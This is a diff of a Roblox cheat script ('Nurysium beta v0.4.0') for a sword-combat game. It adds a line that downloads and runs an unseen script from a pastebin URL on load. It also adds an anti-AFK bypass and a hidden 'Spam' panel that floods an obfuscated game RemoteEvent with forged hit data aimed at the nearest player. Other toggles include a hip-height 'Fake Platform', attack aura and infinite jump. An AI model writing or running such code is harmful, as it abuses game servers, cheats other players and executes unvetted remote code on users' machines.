@@ -1,11 +1,22 @@
 -- Nurysium beta v0.4.0
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Snxdfer/FPS-Counter-and-Ping-Counter/refs/heads/main/rainbow.lua"))()
+local vu = game:GetService("VirtualUser")
+if vu then 
+    print("[Anti-AFK] Loaded")
+
+    game:GetService("Players").LocalPlayer.Idled:Connect(function()
+        vu:Button2Down(Vector2.new(0,0), workspace.CurrentCamera.CFrame)
+        wait(1)
+        vu:Button2Up(Vector2.new(0,0), workspace.CurrentCamera.CFrame)
+    end)
+end
+
+loadstring(game:HttpGet("https://pastebin.com/raw/K2MGyDaS"))()
 
 local version = '0.4.0'
 print(version)
 
-setfpscap(200)
+setfpscap(240)
 
 local Stats = game:GetService('Stats')
 local Players = game:GetService('Players')
@@ -266,6 +277,226 @@ function SwordCrateManual()
      
     end
 
+	local ReplicatedStorage = game:GetService("ReplicatedStorage")
+	local RunService = game:GetService("RunService")
+	local UserInputService = game:GetService("UserInputService")
+	local CoreGui = game:GetService("CoreGui")
+	local Players = game:GetService("Players")
+	local LocalPlayer = Players.LocalPlayer
+	local TweenService = game:GetService("TweenService")
+	
+	local hitremote
+	for _, v in pairs(game:GetDescendants()) do
+		if v and v.Name:find("\n") and v:IsA("RemoteEvent") then
+			hitremote = v
+			break
+		end
+	end
+	
+	local spamFrequency = 0.001
+	local maxSpamRate = 100
+	local minSpamRate = 1000
+	local spamRate = maxSpamRate
+	local debounce = false
+	local SpamOn = false
+	local lastSpamTime = tick()
+	local heartbeatConnection
+	
+	local cframes = {}
+	for i = 1, 50 do
+		table.insert(cframes, CFrame.new(math.random(-1000, 1000), math.random(0, 200), math.random(-200, 200)))
+	end
+	
+	local function getPlayerPositions()
+		local playersPos = {}
+		for _, player in pairs(Players:GetPlayers()) do
+			if player ~= LocalPlayer and player.Character and player.Character:IsDescendantOf(game.Workspace:FindFirstChild("Alive")) then
+				local pos = player.Character.PrimaryPart.Position + Vector3.new(10, 10, 10)
+				playersPos[player.Name] = pos
+			end
+		end
+		return playersPos
+	end
+	
+	local function getClosestPlayer()
+		local closestPlayer
+		local minDist = math.huge
+		local playerPositions = getPlayerPositions()
+		for _, player in pairs(Players:GetPlayers()) do
+			if player ~= LocalPlayer and playerPositions[player.Name] then
+				local dist = LocalPlayer:DistanceFromCharacter(playerPositions[player.Name])
+				if dist < minDist then
+					minDist = dist
+					closestPlayer = player
+				end
+			end
+		end
+		return closestPlayer
+	end
+	
+	local Spam = Instance.new("ScreenGui")
+	local BG = Instance.new("Frame")
+	local Title = Instance.new("TextLabel")
+	local Toggle = Instance.new("TextButton")
+	local StatusPF = Instance.new("TextLabel")
+	local Status = Instance.new("TextLabel")
+	
+	local SpamOn = false
+	
+	Spam.Name = "Spam"
+	Spam.Parent = CoreGui
+	Spam.Enabled = false
+	
+	BG.Name = "BG"
+	BG.Parent = Spam
+	BG.BackgroundColor3 = Color3.new(0.0980392, 0.0980392, 0.0980392)
+	BG.BorderColor3 = Color3.new(0.0588235, 0.0588235, 0.0588235)
+	BG.BorderSizePixel = 2
+	BG.Position = UDim2.new(0.5, -75, 0.5, -63)
+	BG.Size = UDim2.new(0, 120, 0, 90)
+	BG.Active = true
+	BG.Draggable = true
+	
+	Title.Name = "Title"
+	Title.Parent = BG
+	Title.BackgroundColor3 = Color3.new(0.266667, 0.00392157, 0.627451)
+	Title.BorderColor3 = Color3.new(0.180392, 0, 0.431373)
+	Title.BorderSizePixel = 2
+	Title.Size = UDim2.new(1, 0, 0, 25)
+	Title.Font = Enum.Font.Highway
+	Title.Text = "Spam"
+	Title.TextColor3 = Color3.new(1, 1, 1)
+	Title.FontSize = Enum.FontSize.Size24
+	Title.TextSize = 23
+	Title.TextStrokeColor3 = Color3.new(0.180392, 0, 0.431373)
+	Title.TextStrokeTransparency = 0
+	
+	Toggle.Parent = BG
+	Toggle.BackgroundColor3 = Color3.new(0.266667, 0.00392157, 0.627451)
+	Toggle.BorderColor3 = Color3.new(0.180392, 0, 0.431373)
+	Toggle.BorderSizePixel = 2
+	Toggle.Position = UDim2.new(0.5, -58, 0.6, -20)
+	Toggle.Size = UDim2.new(0, 117, 0, 30)
+	Toggle.Font = Enum.Font.Highway
+	Toggle.FontSize = Enum.FontSize.Size18
+	Toggle.Text = "Toggle"
+	Toggle.TextColor3 = Color3.new(1, 1, 1)
+	Toggle.TextSize = 18
+	Toggle.TextStrokeColor3 = Color3.new(0.180392, 0, 0.431373)
+	Toggle.TextStrokeTransparency = 0
+	
+	StatusPF.Name = "StatusPF"
+	StatusPF.Parent = BG
+	StatusPF.BackgroundColor3 = Color3.new(1, 1, 1)
+	StatusPF.BackgroundTransparency = 1
+	StatusPF.Position = UDim2.new(0.5, -40, 0.85, -15)
+	StatusPF.Size = UDim2.new(0, 60, 0, 33)
+	StatusPF.Font = Enum.Font.Highway
+	StatusPF.FontSize = Enum.FontSize.Size18
+	StatusPF.Text = "Status:"
+	StatusPF.TextColor3 = Color3.new(1, 1, 1)
+	StatusPF.TextSize = 18
+	StatusPF.TextStrokeColor3 = Color3.new(0.333333, 0.333333, 0.333333)
+	StatusPF.TextStrokeTransparency = 0
+	StatusPF.TextWrapped = true
+	
+	Status.Name = "Status"
+	Status.Parent = BG
+	Status.BackgroundColor3 = Color3.new(1, 1, 1)
+	Status.BackgroundTransparency = 1
+	Status.Position = UDim2.new(0.5, 0, 0.84, -13)
+	Status.Size = UDim2.new(0, 50, 0, 33)
+	Status.Font = Enum.Font.Highway
+	Status.FontSize = Enum.FontSize.Size18
+	Status.Text = "Off"
+	Status.TextColor3 = Color3.new(1, 0, 0)
+	Status.TextSize = 15
+	Status.TextWrapped = true
+	
+	local CreditsGui = Instance.new("ScreenGui")
+	local CreditsBG = Instance.new("Frame")
+	local CreditsText = Instance.new("TextLabel")
+	
+	CreditsGui.Name = "CreditsGui"
+	CreditsGui.Parent = CoreGui
+	
+	CreditsBG.Name = "CreditsBG"
+	CreditsBG.Parent = CreditsGui
+	CreditsBG.BackgroundColor3 = Color3.new(0, 0, 0)
+	CreditsBG.BackgroundTransparency = 1
+	CreditsBG.Position = UDim2.new(1, -159, 1, -34)
+	CreditsBG.Size = UDim2.new(0, 150, 0, 30)
+	
+	CreditsText.Name = "CreditsText"
+	CreditsText.Parent = CreditsBG
+	CreditsText.BackgroundColor3 = Color3.new(1, 1, 1)
+	CreditsText.BackgroundTransparency = 1
+	CreditsText.Size = UDim2.new(1, 0, 1, 0)
+	CreditsText.Font = Enum.Font.SourceSans
+	CreditsText.FontSize = Enum.FontSize.Size18
+	CreditsText.Text = ""
+	CreditsText.TextColor3 = Color3.new(1, 1, 1)
+	CreditsText.TextSize = 14
+	CreditsText.TextStrokeColor3 = Color3.new(0.196078, 0.196078, 0.196078)
+	CreditsText.TextStrokeTransparency = 0
+	CreditsText.TextWrapped = true
+	
+	local function UpdateToggleVisual()
+		Toggle.Text = SpamOn and "On" or "Off"
+		local color = SpamOn and Color3.new(0, 1, 0) or Color3.new(1, 0, 0)
+	
+		local tweenInfo = TweenInfo.new(0.5, Enum.EasingStyle.Quart, Enum.EasingDirection.Out)
+		local tweenGoal = { TextStrokeColor3 = color, TextColor3 = color }
+	
+		local toggleTween = TweenService:Create(Toggle, tweenInfo, tweenGoal)
+		toggleTween:Play()
+	
+		Status.Text = SpamOn and "On" or "Off"
+		Status.TextColor3 = color
+	end
+	
+	local function fireHitRemote()
+		if debounce then return end
+		debounce = true
+		delay(0.05, function() debounce = false end)
+	
+		local args = {
+			[1] = 0.5,
+			[2] = cframes[math.random(1, #cframes)],
+			[3] = getClosestPlayer() and {[tostring(getClosestPlayer().Name)] = getClosestPlayer().Character.PrimaryPart.Position} or getPlayerPositions(),
+			[4] = {
+				[1] = math.random(300, 700),
+				[2] = math.random(300, 700),
+				[3] = math.random(300, 700),
+			}
+		}
+		if hitremote then
+			hitremote:FireServer(unpack(args))
+		end
+	end
+	
+	local function spamRoutine()
+		while SpamOn do
+			if tick() - lastSpamTime >= spamFrequency then
+				fireHitRemote()
+				lastSpamTime = tick()
+			end
+			task.wait(spamFrequency)
+		end
+	end
+	
+	Toggle.MouseButton1Click:Connect(function()
+		SpamOn = not SpamOn
+		UpdateToggleVisual()
+		if SpamOn then
+			heartbeatConnection = RunService.Heartbeat:Connect(spamRoutine)
+		else
+			if heartbeatConnection then
+				heartbeatConnection:Disconnect()
+			end
+		end
+	end)
+
 library:create_toggle("Attack Aura", "Combat", function(toggled)
 	resolve_parry_Remote()
 	getgenv().aura_Enabled = toggled
@@ -278,6 +509,23 @@ end)
 
 library:create_toggle("Hit Sound", "Combat", function(toggled)
 	getgenv().hit_sound_Enabled = toggled
+end)
+
+library:create_toggle("Clash UI", "Combat", function(Value)
+	Spam.Enabled = Value
+end)
+
+local character = game.Players.LocalPlayer.Character or game.Players.LocalPlayer.CharacterAdded:Wait()
+library:create_toggle("Fake Platform", "Combat", function(Value)
+    FakePlatform = Value
+
+    local humanoid = character:WaitForChild("Humanoid")
+
+    if FakePlatform then
+        humanoid.HipHeight = 50
+	else
+        humanoid.HipHeight = 0
+    end
 end)
 
 library:create_toggle("Hit Effect", "World", function(toggled)
@@ -329,6 +577,7 @@ end)
 library:create_toggle("Infinite Jump", "World", function(state)
 	InfiniteJumpEnabled = state
 end)
+
 
 library:create_toggle("Auto Sword Crate", "Auto Crates", function(state)
 	getgenv().ASC = state
